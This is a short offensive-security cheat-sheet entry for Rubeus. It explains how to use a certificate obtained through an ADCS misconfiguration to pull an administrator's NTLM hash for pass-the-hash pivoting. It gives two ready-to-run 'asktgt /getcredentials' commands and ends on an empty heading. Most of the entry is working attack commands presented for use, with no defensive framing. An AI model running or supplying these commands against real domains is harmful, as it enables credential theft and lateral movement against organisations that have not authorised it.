# Rubeus

```jsx
/usr/share/windows-resources/rubeus
```

Use when you’ve obtained a `.pfx` certificate for a user/admin via an ADCS misconfiguration (e.g. Certipy ESC1/ESC8 exploitation) and you’re already on a **Windows host/shell** (Evil-WinRM, RDP, C2 beacon). You need that account’s NTLM hash to pivot into standard hash-based attacks (psexec, wmiexec, secretsdump, etc.), since PKINIT alone only gets you a Kerberos ticket — not a hash usable with NTLM tools.

With and without passwords : 

```jsx
./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

```jsx
./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:'certpass' /getcredentials /show /nowrap
```

NTLM hash catcher (Already have code execution + NTLM/Net-NTLMv2 to authenticate) :

